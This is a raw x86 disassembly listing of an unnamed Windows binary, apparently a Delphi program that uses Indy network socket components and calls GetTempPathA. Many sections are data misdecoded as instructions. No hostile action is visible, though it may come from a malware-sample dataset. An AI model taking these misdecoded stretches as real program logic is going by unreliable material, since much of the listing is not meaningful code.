xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465334
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_465364
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_465389
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465390
retn
sub_465477
inc [ ebx ]
add [ eax ] al
add [ ebp + 0x63 ] al
add [ esp + edx * 2 + 0x10030046 ] al
push esp
dec ecx
dec ebp
popad
js r-xdata
add al [ eax ]
add [ eax ] al
rcl [ esi + eax * 2 ] 0xd
jb r-xdata
imul ebp [ esi + 0x65 ] 0x69746341
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0xb004654 ] al
insd
popad
inc ebp
js r-xdata
salc
dec edi
push ebx
adc [ edx ] eax
cmp [ cs : eax + eax ] eax
jo r-xdata
mov eax ebx
call sub_40c664
pop esi
pop ebx
retn
rcl [ ebx + 0x56 ] 0x8b
mov ebx eax
mov edx esi
outsb
outsb
je r-xdata
insb
outsd
bound esp [ ecx + 0x6c ]
lea eax [ eax ]
xor [ ebp + 0x46 ] dl
add [ ecx ] dl
add ebp [ esi ]
xor [ ecx ] dh
add al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
or [ ecx + 0x64 ] cl
inc edi
imul ebp [ edi + 0x6e ] 0x53616d07
jo r-xdata
pop es
jb r-xdata
inc edi
dec ecx
imul esi [ eax + ecx + 0x49 ] 0x6f6c4764
bound esp [ ecx + 0x6c ]
les edx [ esi + eax * 2 ]
add ecx [ esi ]
push esp
dec ecx
push edx
jne r-xdata
inc esi
popad
insb
jae r-xdata
sar [ ebp + 0x2 ] 0x1
push esp
jb r-xdata
add [ eax + edx + 0x49080040 ] dl
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
mov eax eax
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
sar [ ebx ] 0xd0
jge r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x49080040 ] dl
or [ ecx + 0x64 ] cl
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
nop
or al 0x55
inc esi
add [ ecx ] dl
add ch [ esi ]
cmp [ eax + eax ] eax
retn
jb r-xdata
pop es
inc esp
jo r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al al
push esp
inc esi
add [ 0x534f7372 ] cl
add [ eax ] al
add [ eax ] al
mov eax edx
sub_465650
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4656af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_40458c
mov eax [ ebx ]
call sub_404400
push eax
mov eax [ ebx ]
call sub_404200
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_40458c
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_465550
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4656b6
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_4656bc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_465785
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_40434c
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_407ed0
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407ed0
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_404544
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404460
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403f94
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46578c
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f64
retn
push ebx
mov eax edi
call sub_404200
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404460
mov eax ebx
call sub_403f40
jmp r-xdata
sub_4657a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_4656bc
mov eax esi
mov edx r-xdata
call sub_40434c
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_404544
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404460
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403f94
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_404200
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404460
jmp r-xdata
mov eax ebx
call sub_403f40
jmp r-xdata
sub_465890
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax esi
call sub_404200
mov edi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
mov bl [ eax ]
inc eax
mov [ esp + 0x8 ] eax
mov esi [ esp ]
mov ebp edi
dec ebp
mov edi [ esp + 0x4 ]
sub edi ebp
test ebp ebp
jne r-xdata
test edi edi
jle r-xdata
test edi edi
jle r-xdata
xor eax eax
cmp bl [ esi ]
jne r-xdata
cmp bl [ esi ]
jne r-xdata
inc esi
inc esi
mov ecx ebp
mov edx [ esp + 0x8 ]
mov eax esi
call sub_407f78
test al al
je r-xdata
inc esi
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
inc eax
jmp r-xdata
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
jmp r-xdata
jmp r-xdata
sub_46591c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebx eax
mov eax ebx
call sub_404200
mov edi eax
mov eax [ esp ]
call sub_404200
mov esi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp esi edi
jge r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
mov ebx [ esp ]
cmp [ esp + 0x4 ] 0x0
jbe r-xdata
mov al [ ebp ]
mov [ esp + 0x8 ] al
inc ebp
dec edi
sub esi edi
test esi esi
jg r-xdata
add ebx [ esp + 0x4 ]
dec ebx
inc esi
sub esi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
jmp r-xdata
xor eax eax
mov al [ ebx ]
cmp al [ esp + 0x8 ]
jne r-xdata
inc ebx
inc ebx
mov ecx edi
mov edx ebp
mov eax ebx
call sub_407f78
test al al
je r-xdata
dec esi
test esi esi
jg r-xdata
mov eax ebx
sub eax [ esp ]
jmp r-xdata
sub_4659a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_465a5b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465a62
retn
mov eax rw-data
call sub_40d3ac
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
call sub_403f40
mov eax rw-data
mov edx [ r-xdata ]
call sub_405224
mov eax rw-data
mov edx [ r-xdata ]
call sub_405224
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4049c8
sub_465a64
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_465b37
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465b3e
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
lea eax [ ebp - 0x4 ]
call sub_465650
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403f94
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402ca4
jne r-xdata
mov eax sub_40c6a4
mov [ rw-data ] eax
mov [ rw-data ] sub_465888
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405124
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f94
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405124
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f94
sub_465c84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ebp + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ebp
inc esi
add [ eax + eax ] bh
add [ eax ] al
test [ ebx + 0x46 ] bl
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ esi + ebx * 2 - 0x7a73ffba ] bl
inc ecx
add [ eax - 0x16 ] dl
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
inc ecx
outsb
je r-xdata
popad
je r-xdata
inc esi
jb r-xdata
call sub_403490
outsd
outsb
dec eax
arpl [ ecx + 0x74 ] sp
jpe r-xdata
mov [ rw-data ] esi
cmp [ rw-data ] 0x0
je r-xdata
dec ecx
insb
jb r-xdata
outsd
jb r-xdata
imul ebp [ edi + 0x6e ] 0x50736148
inc edx
popad
jae r-xdata
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x31 ] 0x1
mov [ esi + 0x34 ] 0xfa
mov [ esi + 0x38 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465e7e
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov ebx edx
mov esi eax
xor eax eax
add esp 0xfffffff0
push ebp
push sub_465e77
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_41e6d8
test [ esi + 0x1c ] 0x10
je r-xdata
popad
jae r-xdata
int3
je r-xdata
mov bl bh
push esi
inc esi
sbb al 0x10
cmp al 0x10
inc eax
add [ eax + eax ] dh
add bh bh
xor al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xfa ] al
add al 0x0
or ecx [ ecx + 0x64 ]
insb
push esp
imul ebp [ ebp + 0x65 ] 0x74754f
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e4f0c00
insb
jns r-xdata
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
nop
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
push 0x64496e65
insb
sub_465ce2
inc ecx
add [ eax ] dh
in al dx
inc ecx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add al ch
pop ebp
inc esi
add [ ecx + ebp + 0x40 ] ch
add [ ecx ] dl
push esp
dec ecx
inc ecx
outsb
je r-xdata
xor [ eax ] eax
inc esi
jb r-xdata
xchg ebp eax
salc
stc
dec [ ebx + 0x33f08bda ]
rcl [ ebp + 0x68 ] 0x77
pop esi
inc esi
add [ edi + edi * 8 + 0x30 ] ah
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
add eax [ eax ]
push ss
inc ecx
jo r-xdata
push [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jpe r-xdata
mov [ rw-data ] esi
cmp [ rw-data ] 0x0
je r-xdata
dec ecx
insb
jb r-xdata
add bh bh
add [ eax ] eax
inc edx
popad
jae r-xdata
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x31 ] 0x1
mov [ esi + 0x34 ] 0xfa
mov [ esi + 0x38 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465e7e
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_41e6d8
test [ esi + 0x1c ] 0x10
mov ebx edx
mov esi eax
xor eax eax
add esp 0xfffffff0
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov eax eax
sbb [ ebp + 0x46 ] bl
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
outsb
je r-xdata
push ebp
push sub_465e77
push [ fs : eax ]
je r-xdata
popad
je r-xdata
inc esi
jb r-xdata
je r-xdata
mov bl bh
push esi
inc esi
sbb al 0x10
cmp al 0x10
inc eax
add [ eax + eax ] dh
add bh bh
xor al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xfa ] al
add al 0x0
or ecx [ ecx + 0x64 ]
insb
push esp
imul ebp [ ebp + 0x65 ] 0x74754f
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e4f0c00
insb
jns r-xdata
call sub_403490
dec eax
outsd
outsb
arpl [ ecx + 0x74 ] sp
jpe r-xdata
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
nop
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
push 0x64496e65
insb
imul ebp [ edi + 0x6e ] 0x50736148
inc edx
popad
jae r-xdata
popad
jae r-xdata
int3
sub_465e9c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e724
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_465ec8
push ebx
push esi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_465f0c
test al al
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
sete al
or bl al
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_465f0c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
call sub_46586c
test al al
jne r-xdata
test al al
je r-xdata
mov al 0x1
retn
mov eax [ rw-data ]
mov al [ eax + 0x30 ]
sub_465f34
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_465f59
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465f60
retn
sub_466280
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e6d8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_4662f2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
add esp 0xfffffff0
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4662f9
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ r-xdata ]
call sub_463bfc
mov edx [ rw-data ]
mov [ edx ] eax
sub_466318
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034f8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_41e724
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_46637f
push [ fs : eax ]
mov [ fs : eax ] esp
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466386
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ rw-data ]
call sub_40d3ac
sub_4663a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46644f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x32 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466456
lea eax [ ebp - 0x10 ]
call sub_403f40
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax [ ebp + 0x8 ]
inc eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
call sub_409118
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
xor ecx ecx
call sub_409118
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
jmp r-xdata
sub_466460
push ebx
push esi
xor ebx ebx
mov bl dl
lea ebx [ ebx + ebx * 2 ]
inc [ eax + ebx * 4 + 0x58 ]
cmp [ eax + ebx * 4 + 0x58 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ eax + ebx * 4 + 0x54 ] ecx
xor esi esi
mov [ eax + ebx * 4 + 0x50 ] esi
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_466498
push ebx
push esi
xor ebx ebx
mov bl dl
lea esi [ ebx + ebx * 2 ]
cmp [ eax + esi * 4 + 0x58 ] 0x0
jle r-xdata
pop esi
pop ebx
retn
add [ eax + esi * 4 + 0x50 ] ecx
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ecx [ eax + esi * 4 + 0x50 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4664c8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
lea edi [ eax + eax * 2 ]
cmp [ esi + edi * 4 + 0x58 ] 0x1
jne r-xdata
dec [ esi + edi * 4 + 0x58 ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x4a ] 0x0
je r-xdata
mov ecx ebx
mov edx esi
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
sub_4664f8
or [ eax ] eax
add [ eax ] al
sbb [ ebp - 0x783fffb8 ] al
dec eax
add [ eax * 4 - 0x783fffb8 ] dl
dec eax
add [ eax ] dl
test [ eax ] ecx
rol [ edi - 0x7af3ffb8 ] 0x48
add al al
xchg [ eax ] ecx
or [ ebp - 0x77d3ffb8 ] al
dec eax
add [ eax * 4 - 0x75a3ffb8 ] al
dec eax
add [ eax ] al
test [ eax ] ecx
xor al 0x86
dec eax
add ah bh
test [ eax ] cl
enter 0x4888 0x0
clc
test [ eax ] cl
rol [ esi - 0x74aaffb8 ] 0x1
in al dx
xor eax eax
push ebp
push sub_466580
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466587
retn
mov eax rw-data
mov ecx 0x9
mov edx [ r-xdata ]
call sub_4049c8
sub_466699
pop edx
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add ah cl
push 0x46
add [ ebp + eax * 4 - 0x7a6bffbf ] cl
inc ecx
add ah dh
outsd
inc esi
add [ eax + ecx * 4 - 0x767bffbf ] ah
inc ecx
add [ ecx + ecx * 4 - 0x7653ffbf ] dh
inc ecx
add [ eax + 0x6e ] bl
inc esi
add [ eax + 0x6a ] ah
inc esi
add [ edx + ebp * 2 + 0x6c540046 ] dl
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
outsb
insb
mov eax eax
sbb [ edi + 0x46 ] ah
add [ edi ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
[ eax + eax ]
outsd
jb r-xdata
cmp al 0x10
inc eax
add [ eax ] ch
popad
outsb
insb
mov esp 0x80004666
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ eax + 0x46 ] 0x0
or al 0x0
add [ eax ] al
shl [ edi + 0x46 ] 0x1
sbb al 0x68
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 ] bl
add [ eax ] al
[ eax ]
dec ebp
imul ebp [ esi + 0x3c ] 0x28004010
add [ 0x65696c43 ] cl
outsb
je r-xdata
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
popad
outsb
insb
add al 0x0
cmp al 0x10
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ 0x43644945 ] dl
insb
insb
inc edx
jns r-xdata
arpl [ ebx + 0x61 ] bp
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
adc al 0x45
dec ecx
push eax
popad
popad
outsb
insb
inc ebp
jb r-xdata
inc esi
add [ eax + eax ] cl
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x68
outsd
jb r-xdata
jb r-xdata
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004669 ] ch
add [ eax ] al
add al dl
inc esi
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
push 0xc0046
add [ eax ] al
shl [ edi + 0x46 ] 0x1
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edx ] dl
inc ebp
outsd
jb r-xdata
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax * 2 + 0x6f536449 ] dl
arpl [ ebx + 0x65 ] bp
je r-xdata
dec ebp
popad
js r-xdata
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
inc ebx
push es
add [ eax ] al
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
adc [ edx + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
push 0x46
add [ eax + eax ] cl
add [ eax ] al
shl [ edi + 0x46 ] 0x1
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] bl
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
add al cl
xor eax [ eax ]
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ ebx ] dl
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
imul ebp [ esi + 0x64 ] 0x74726f50
outsd
jne r-xdata
inc ebx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax * 2 + 0x61506449 ] dl
inc eax
add [ eax + 0x4668 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004668 ] al
add [ eax ] al
add al dl
inc esi
pop ebx
inc ecx
add [ eax + eax ] al
push cs
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov esp 0x80004666
add bh bh
add [ eax ] eax
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
cmp al 0x10
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
dec ecx
dec esi
outsd
je r-xdata
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
shr [ eax + 0x4669 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x69
inc esi
